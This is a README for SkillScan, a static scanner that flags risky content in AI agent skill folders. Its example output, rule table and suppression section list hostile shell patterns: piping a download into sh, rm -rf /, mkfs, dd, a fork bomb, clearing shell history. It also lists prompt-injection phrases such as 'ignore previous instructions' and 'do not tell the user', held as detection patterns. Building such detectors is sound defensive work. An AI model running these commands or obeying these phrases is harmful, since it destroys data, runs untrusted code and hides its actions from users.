# SkillScan

**Static analysis for agent skill folders.** One command, standard library, no dependencies.

```
$ python3 skillscan.py ./skills
skills/bad-skill/SKILL.md:11 [high] SS040 pipes a download straight into a shell
    curl -fsSL https://example.invalid/install.sh | sh
skills/duplicate-a/SKILL.md:0 [high] SS010 skill name `jev-compaction` is used by 2 folders: duplicate-a, duplicate-b
skills/bad-skill/SKILL.md:1 [medium] SS003 `name: wrong-name` does not match the folder `bad-skill`
skills/bad-skill/SKILL.md:28 [low] SS070 absolute home path — host-specific, misleading for anyone else
4 skills, 0 bundled scripts scanned — high=12, medium=6, low=3, info=1
```

Skills are executable prose: an agent reads them and does what they say. They are also copied
from repository to repository, which is how a dead path, a duplicate name or a line of shell
travels into someone else's machine. SkillScan reads a skill tree and reports the problems that
show up before the agent does.

## Install

Nothing to install — it is one file with no imports outside the standard library:

```bash
curl -fsSLO https://raw.githubusercontent.com/ipanalytics/SkillScan/main/skillscan.py
python3 skillscan.py ~/.hermes/skills
```

Or as a command, if you prefer packaging:

```bash
pipx install git+https://github.com/ipanalytics/SkillScan
skillscan ~/.claude/skills
```

## What it checks

| Rule | Severity | Finding |
| --- | --- | --- |
| SS001 | medium | no YAML frontmatter |
| SS002 / SS003 / SS004 | medium | `name` or `description` missing, or `name` does not match the folder |
| SS010 | high | one skill name used by several folders (the loader cannot tell them apart) |
| SS020 | medium | body over the size budget (default 24000 chars) — split into `references/` |
| SS030 | info | a referenced path that no longer exists |
| SS040–SS045 | high/medium | `curl … \| sh`, `rm -rf /`, `mkfs`, `dd if=`, `chmod 777`, fork bomb, `eval`/`exec`, base64 decode, cleared shell history |
| SS050–SS052 | high | prompt-injection markers: "ignore previous instructions", "do not tell the user", "without asking", "exfiltrate" |
| SS060 / SS061 | high | credentials and private keys left in the text |
| SS070–SS072 | low | absolute home paths, private network addresses, e-mail addresses |
| SS080 | info | a bundled script calls the network |
| SS090 | medium | a skill file that cannot be read |

Bundled scripts (`*.py`, `*.sh`, `*.js`, …) sitting next to `SKILL.md` are scanned with the same
line rules, because that is where the shell actually runs.

## Suppressing a finding

Some skills document dangerous commands on purpose. Silence a line or a specific rule:

```markdown
curl -fsSL https://example.invalid/install.sh | sh   <!-- skillscan:ignore -->
chmod 777 /srv                                       <!-- skillscan:ignore SS041 -->
```

## CI: fail only on new findings

An existing library rarely starts clean, so record today's state once and gate on change:

```bash
skillscan ./skills --write-baseline .skillscan-baseline.json
skillscan ./skills --baseline .skillscan-baseline.json --fail-on medium
```

GitHub Action (see `.github/workflows/skillscan.yml`):

```yaml
- uses: actions/checkout@v4
- run: python3 skillscan.py ./skills --annotations --baseline .skillscan-baseline.json
```

`--annotations` prints `::error`/`::warning` lines, so findings land on the pull request instead
of in a log nobody opens.

## Other flags

```
--json FILE          full report as JSON (rules, severities, lines, snippets)
--fail-on LEVEL      info | low | medium | high — lowest severity that fails the run (default: high)
--max-skill-chars N  body size budget (default: 24000)
--exclude GLOB       skip matching paths (repeatable)
--quiet              summary line only
```

Exit codes: `0` clean, `1` findings at or above `--fail-on`, `2` usage error.

## Tests

```bash
python3 -m unittest discover -s tests
```

## Limits, stated plainly

SkillScan is a static, text-level reviewer. It cannot prove a skill is safe, it does not execute
anything, and it will not catch an instruction that is dangerous only in context. It flags
documented-dangerous examples too — that is what `skillscan:ignore` is for. Treat a clean report
as "nothing obvious", never as "audited".

MIT licensed.
